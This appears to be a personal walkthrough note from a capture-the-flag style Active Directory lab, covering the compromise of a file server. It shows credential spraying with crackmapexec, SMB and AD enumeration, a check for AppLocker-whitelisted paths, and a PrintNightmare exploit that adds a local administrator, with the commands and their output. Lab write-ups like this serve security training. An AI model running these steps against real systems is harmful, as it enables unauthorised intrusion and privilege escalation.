##  PC-FILESRV01
IP: 10.200.111.35
* * *
## RUSTSCAN
Rustscan is not picking up right ports, seems like all 65k ports are shown as open.
Let's try to see which devices can we connect with credentials found in S-SRV01.
* * *
## CRACKMAPEXEC
Let's see which devices can we autheticate in 10.200.111.0/24 subnet
└─# crackmapexec smb 10.200.111.0/24 -u watamet -p Nothingtoworry! -d HOLO.LIVE
SMB         10.200.111.35   445    PC-FILESRV01     [*] Windows 10.0 Build 17763 x64 (name:PC-FILESRV01) (domain:HOLO.LIVE) (signing:False) (SMBv1:False)
SMB         10.200.111.31   445    S-SRV01          [*] Windows 10.0 Build 17763 x64 (name:S-SRV01) (domain:HOLO.LIVE) (signing:False) (SMBv1:False)
SMB         10.200.111.30   445    DC-SRV01         [*] Windows 10.0 Build 17763 x64 (name:DC-SRV01) (domain:HOLO.LIVE) (signing:False) (SMBv1:False)
SMB         10.200.111.35   445    PC-FILESRV01     [+] HOLO.LIVE\watamet:Nothingtoworry!
SMB         10.200.111.31   445    S-SRV01          [+] HOLO.LIVE\watamet:Nothingtoworry! (Pwn3d!)
SMB         10.200.111.30   445    DC-SRV01         [+] HOLO.LIVE\watamet:Nothingtoworry!

* * *
## Enumeration
We can try to login with Evil-winrm:
![556914832a598a99373ec7d5f5781bab.png](../../../_resources/556914832a598a99373ec7d5f5781bab.png)

It's failing which means watamet have no permissions on WinRM, but we can try with smexec or psexec.
Edit: it's failing againg:
![7debbe47d9ee788d7f704be9c2396846.png](../../../_resources/7debbe47d9ee788d7f704be9c2396846.png)

But what about SMB shares on the Filesystem?
![98135b6da283347c62097106fed7bc58.png](../../../_resources/98135b6da283347c62097106fed7bc58.png)

We can read /users, so let's do it!
![cff5bb865893757fdd63f39d1b6e566d.png](../../../_resources/cff5bb865893757fdd63f39d1b6e566d.png)

Checking seems like we have RDP open on Fileserver so let's try to RDP:
We can check all Whitelisted paths from Applocker policy with this script:https://github.com/sparcflow/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1

PS C:\Temp> .\Applocker.ps1
[*] Processing folders recursively in C:\windows
[+]  C:\windows\Tasks
[+]  C:\windows\tracing
[+]  C:\windows\System32\spool\drivers\color
[+]  C:\windows\tracing\ProcessMonitor
PS C:\Temp>

As here we can see that we can place our script/executables under C:\windows\tasks
And we can grab some more informations about EDR installed
![0604ee453cc3fd6ed63c4f1ea5ad1512.png](../../../_resources/0604ee453cc3fd6ed63c4f1ea5ad1512.png)

Now we can upload Powersploit and do some AD enumeration:
PS C:\windows\Tasks> Get-DomainGroup "Domain Admins"


grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins
whenchanged            : 11/20/2020 3:36:10 AM
objectsid              : S-1-5-21-471847105-3603022926-1728018720-512
objectclass            : {top, group}
cn                     : Domain Admins
usnchanged             : 29026
dscorepropagationdata  : {11/15/2020 11:41:05 PM, 10/23/2020 1:33:58 AM, 10/22/2020 11:58:48 PM, 10/22/2020 11:43:31 PM...}
memberof               : {CN=Denied RODC Password Replication Group,OU=Groups,DC=holo,DC=live, CN=Remote Desktop Users,CN=Builtin,DC=holo,DC=live, CN=Administrators,CN=Builtin,DC=holo,DC=live}
description            : Designated administrators of the domain
distinguishedname      : CN=Domain Admins,OU=Groups,DC=holo,DC=live
name                   : Domain Admins
member                 : {CN=Shirikami Fubuki,OU=Administration,OU=Employees,DC=holo,DC=live, CN=Inugami Korone,OU=Administration,OU=Employees,DC=holo,DC=live, CN=SRV ADMIN,OU=Service Accounts,OU=Employees,DC=holo,DC=live, CN=Administrator,CN=Users,DC=holo,DC=live}
usncreated             : 12345
whencreated            : 10/22/2020 11:43:30 PM
instancetype           : 4
objectguid             : 03941de5-3c90-4f4d-b5c5-70bcf6bbfe1c
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=holo,DC=live

2 are DA in the Domain HOLO.LIVE one is Shirikami and the other is Inugami.
Now we are not following the intended guide, instead we will try to exploit print nightmare bug:
https://github.com/gyaansastra/Print-Nightmare-LPE.git

We can first check that printspooler is running:
![13f9e4e125e1b637e293bb0ea1abcb02.png](../../../_resources/13f9e4e125e1b637e293bb0ea1abcb02.png)

Then we hope that it havenät been patched, and we run the previous script to add our username to the local admins:
PS C:\windows\Tasks> Import-Module .\print.ps1
PS C:\windows\Tasks> Invoke-Nightmare -NewUser "yovecio" -NewPassword "Coglione1!"
[+] created payload at C:\Users\watamet\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user yovecio as local administrator
[+] deleting payload from C:\Users\watamet\AppData\Local\Temp\nightmare.dll
PS C:\windows\Tasks>
PS C:\windows\Tasks>
PS C:\windows\Tasks> net users

User accounts for \\PC-FILESRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount       yovecio
The command completed successfully.

Moving to last step, DC.

 




